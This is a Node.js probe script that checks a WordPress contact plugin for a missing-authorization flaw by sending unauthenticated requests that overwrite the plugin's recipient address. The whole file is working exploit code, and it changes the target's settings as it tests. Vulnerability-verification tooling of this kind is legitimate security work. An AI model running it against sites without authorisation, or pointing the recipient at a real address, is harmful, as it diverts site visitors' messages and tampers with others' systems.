#!/usr/bin/env node
/**
 * Exploit-verification probe for CVE-2026-90001 (Quick Contact <= 1.0.0)
 * Missing authorization on the `qc_save_settings` AJAX action allows any
 * unauthenticated visitor to change the `qc_recipient` option (the address
 * that contact-form submissions are sent to).
 *
 * Usage: node probe.mjs <base-url>
 *
 * Exit code 0 -> target is exploitable (vulnerable)
 * Exit code 1 -> target is NOT exploitable (appears patched / not vulnerable)
 *
 * The script sends requests only to the given base URL, performs no
 * filesystem writes, and attempts to leave the target's `qc_recipient`
 * option in a harmless/neutral state afterwards (best effort, since the
 * plugin exposes no way to read back the previous value).
 */

const baseUrl = process.argv[2];

if (!baseUrl) {
  console.error('Usage: node probe.mjs <base-url>');
  process.exit(1);
}

let origin;
try {
  origin = new URL(baseUrl).origin;
} catch (err) {
  console.error(`Invalid base URL: ${baseUrl}`);
  process.exit(1);
}

const ajaxUrl = `${origin}/wp-admin/admin-ajax.php`;

/**
 * Sends an unauthenticated qc_save_settings request (no cookies, no nonce)
 * and reports whether the server accepted the write.
 */
async function trySetRecipient(email) {
  const body = new URLSearchParams({
    action: 'qc_save_settings',
    recipient: email,
  });

  let res;
  try {
    res = await fetch(ajaxUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: body.toString(),
      // Explicitly send no cookies -> fully unauthenticated request.
      credentials: 'omit',
      redirect: 'follow',
    });
  } catch (err) {
    return { ok: false, error: err };
  }

  let json = null;
  let text = '';
  try {
    text = await res.text();
    json = JSON.parse(text);
  } catch {
    // not JSON, leave json null
  }

  const accepted =
    res.status === 200 &&
    json &&
    typeof json === 'object' &&
    json.success === true;

  return { ok: accepted, status: res.status, json, text };
}

(async () => {
  const marker = `probe-${Date.now()}-${Math.random().toString(36).slice(2)}@example.invalid`;

  const attempt = await trySetRecipient(marker);

  if (!attempt.ok) {
    console.log(
      `NOT VULNERABLE: unauthenticated qc_save_settings request was rejected ` +
        `(status=${attempt.status ?? 'n/a'}, body=${JSON.stringify(attempt.json ?? attempt.text ?? attempt.error)}).`
    );
    process.exit(1);
  }

  // Double-check with a second distinct value to rule out a fluke/race and
  // confirm the endpoint consistently accepts unauthenticated writes.
  const marker2 = `probe2-${Date.now()}-${Math.random().toString(36).slice(2)}@example.invalid`;
  const attempt2 = await trySetRecipient(marker2);

  if (!attempt2.ok) {
    console.log(
      `NOT VULNERABLE (inconsistent acceptance on second attempt): ` +
        `status=${attempt2.status ?? 'n/a'}, body=${JSON.stringify(attempt2.json ?? attempt2.text ?? attempt2.error)}.`
    );
    process.exit(1);
  }

  console.log(
    `VULNERABLE: unauthenticated POST to ${ajaxUrl} with action=qc_save_settings ` +
      `was accepted (success:true) and changed the qc_recipient option without ` +
      `any capability/nonce check.`
  );

  // Best-effort restoration: the plugin provides no way to read back the
  // original qc_recipient value, so we cannot restore the exact prior
  // state. As a harmless best effort, clear the recipient override so the
  // plugin falls back to its documented default lookup chain as closely as
  // possible.
  try {
    await trySetRecipient('');
  } catch {
    // ignore restoration errors; exit status reflects vulnerability only
  }

  process.exit(0);
})();
